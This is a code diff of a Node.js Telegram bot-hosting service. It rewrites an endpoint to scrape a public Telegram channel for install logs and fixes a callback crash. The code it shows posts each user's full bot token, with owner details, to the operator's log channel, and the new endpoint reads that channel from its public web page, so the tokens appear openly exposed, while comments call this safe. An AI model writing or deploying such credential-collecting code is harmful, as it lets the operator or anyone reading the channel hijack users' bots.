@@ -26,42 +26,41 @@ async function sendTelegramRequest(token, method, body) {
 }
 
 // -------------------------------------------------------------
-// 1. JSON ENDPOINT: Shows active bots with owner info safely
+// 1. JSON ENDPOINT: Shows active bots via Public Channel Parsing (Fixes 0 issue)
 // -------------------------------------------------------------
 app.get('/users.json', async (req, res) => {
     try {
-        const response = await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/getUpdates?offset=-100&limit=100`);
-        const updateData = await response.json();
+        // Aapke public channel ka link text username
+        const channelUsername = "AhmadTrader3"; 
+        
+        const response = await fetch(`https://t.me/s/${channelUsername}`);
+        const htmlText = await response.text();
 
         let activeBotsMap = new Map();
 
-        if (updateData.ok && updateData.result) {
-            updateData.result.forEach(upd => {
-                if (upd.channel_post && upd.channel_post.chat.id.toString() === LOG_CHANNEL_ID) {
-                    const text = upd.channel_post.text || "";
-                    
-                    if (text.startsWith("BOT_INSTALL|")) {
-                        const parts = text.split("|");
-                        const botUser = parts[1] || "Unknown";
-                        const tokenKey = parts[2] || "";
-                        const ownerFirstName = parts[4] || "Hidden";
-                        const ownerUsername = parts[5] || "None";
+        // Safe Regex patterns logs nikalne ke liye
+        const installMatches = [...htmlText.matchAll(/BOT_INSTALL\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^<\s|]+)/g)];
+        const uninstallMatches = [...htmlText.matchAll(/BOT_UNINSTALL\|([^|]+)\|([^<\s|]+)/g)];
 
-                        // JSON output ke liye sirf safe data save karein (ID aur Token safe hain)
-                        activeBotsMap.set(tokenKey, { 
-                            bot_username: botUser,
-                            owner_first_name: ownerFirstName,
-                            owner_username: ownerUsername
-                        });
-                    } 
-                    else if (text.startsWith("BOT_UNINSTALL|")) {
-                        const parts = text.split("|");
-                        const tokenKey = parts[2];
-                        activeBotsMap.delete(tokenKey);
-                    }
-                }
+        installMatches.forEach(match => {
+            const botUser = match[1] || "Unknown";
+            const tokenKey = match[2] || "";
+            const ownerFirstName = match[4] || "Hidden";
+            const ownerUsername = match[5] || "None";
+
+            activeBotsMap.set(tokenKey, {
+                bot_username: botUser,
+                owner_first_name: ownerFirstName,
+                owner_username: ownerUsername
             });
-        }
+        });
+
+        uninstallMatches.forEach(match => {
+            const tokenKey = match[2];
+            if (activeBotsMap.has(tokenKey)) {
+                activeBotsMap.delete(tokenKey);
+            }
+        });
 
         const finalBotsList = Array.from(activeBotsMap.values());
 
@@ -95,14 +94,12 @@ app.get('/api', async (req, res) => {
         return res.status(400).json({ status: "Not Found", message: "Please enter a valid bot token!" });
     }
 
-    // Kuch details jo hum database message ke liye dynamic nikaalenge
     const botDetails = await sendTelegramRequest(token, 'getMe', {});
     let botUsername = "Unknown_Bot";
     if (botDetails.ok && botDetails.result) {
         botUsername = `@${botDetails.result.username}`;
     }
 
-    // User details nikaalne ke liye Telegram getChat ka use (adminId se background me details check karna)
     let userFirstName = "Admin";
     let userPublicUsername = "None";
     const chatDetails = await sendTelegramRequest(token, 'getChat', { chat_id: adminId });
@@ -118,7 +115,6 @@ app.get('/api', async (req, res) => {
 
         const data = await sendTelegramRequest(token, 'setWebhook', { url: webhookUrl });
         
-        // Ab channel par user ka First Name aur Username bhi bhej rahe hain pipe (|) laga kar
         const dbMessage = `BOT_INSTALL|${botUsername}|${token}|${adminId}|${userFirstName}|${userPublicUsername}`;
         await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', {
             chat_id: LOG_CHANNEL_ID,
@@ -238,7 +234,7 @@ app.post('/api/webhook', async (req, res) => {
         return res.sendStatus(200);
     }
 
-    // ⚡ FEATURE 3: INLINE BUTTONS ACTIONS (Callback Queries)
+    // ⚡ FEATURE 3: INLINE BUTTONS ACTIONS (Fixes Crash)
     if (update.callback_query) {
         const callbackQuery = update.callback_query;
         const callbackData = callbackQuery.data;
@@ -246,9 +242,11 @@ app.post('/api/webhook', async (req, res) => {
         const chatId = callbackQuery.message.chat.id;
         const user = callbackQuery.from;
         
+        // Fix: getMe hit karke dynamic bot username nikalna callback context mein taaki button link crash na ho
+        const currentBot = await sendTelegramRequest(token, 'getMe', {});
         let botName = "bot";
-        if (botDetails && botDetails.ok && botDetails.result) {
-            botName = botDetails.result.username;
+        if (currentBot && currentBot.ok && currentBot.result) {
+            botName = currentBot.result.username;
         }
 
         const editMessage = async (text, keyboard) => {
